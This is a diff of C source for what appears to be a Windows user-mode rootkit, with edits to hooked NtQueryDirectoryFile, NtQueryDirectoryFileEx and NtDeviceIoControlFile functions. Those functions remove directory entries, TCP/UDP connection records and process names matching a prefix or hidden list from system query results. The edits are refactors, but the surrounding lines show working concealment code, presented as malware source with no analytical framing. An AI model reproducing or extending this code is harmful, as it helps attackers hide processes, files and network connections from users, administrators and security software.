@@ -248,8 +248,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 				{
 					if (nextEntryOffset)
 					{
-						i_memcpy
-						(
+						i_memcpy(
 							current,
 							(LPBYTE)current + nextEntryOffset,
 							(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
@@ -311,8 +310,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 				{
 					if (nextEntryOffset)
 					{
-						i_memcpy
-						(
+						i_memcpy(
 							current,
 							(LPBYTE)current + nextEntryOffset,
 							(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
@@ -445,7 +443,7 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 						BOOL hidden = FALSE;
 						if (nsiParam->Type == NsiTcp)
 						{
-							if (processEntry) GetProcessFileName(processEntry->TcpProcessId, FALSE, processName, MAX_PATH);
+							if (processEntry) GetProcessFileName(processEntry->TcpProcessId, processName, MAX_PATH);
 
 							hidden =
 								IsTcpLocalPortHidden(_byteswap_ushort(tcpEntry->Local.Port)) ||
@@ -456,7 +454,7 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 						}
 						else if (nsiParam->Type == NsiUdp)
 						{
-							if (processEntry) GetProcessFileName(processEntry->UdpProcessId, FALSE, processName, MAX_PATH);
+							if (processEntry) GetProcessFileName(processEntry->UdpProcessId, processName, MAX_PATH);
 
 							hidden =
 								IsUdpPortHidden(_byteswap_ushort(udpEntry->Port)) ||
@@ -470,14 +468,7 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 						{
 							if (i < nsiParam->Count - 1) // Do not move following entries, if this is the last entry
 							{
-								if (nsiParam->Type == NsiTcp)
-								{
-									memmove(tcpEntry, (LPBYTE)tcpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);
-								}
-								else if (nsiParam->Type == NsiUdp)
-								{
-									memmove(udpEntry, (LPBYTE)udpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);
-								}
+								memmove(tcpEntry, (LPBYTE)tcpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);
 
 								if (statusEntry)
 								{
@@ -783,7 +774,7 @@ static BOOL GetIsHiddenFromPdhString(LPCWSTR str)
 		else
 		{
 			WCHAR processName[MAX_PATH + 1];
-			if (GetProcessFileName(processId, FALSE, processName, MAX_PATH))
+			if (GetProcessFileName(processId, processName, MAX_PATH))
 			{
 				if (HasPrefix(processName) || IsProcessNameHidden(processName))
 				{
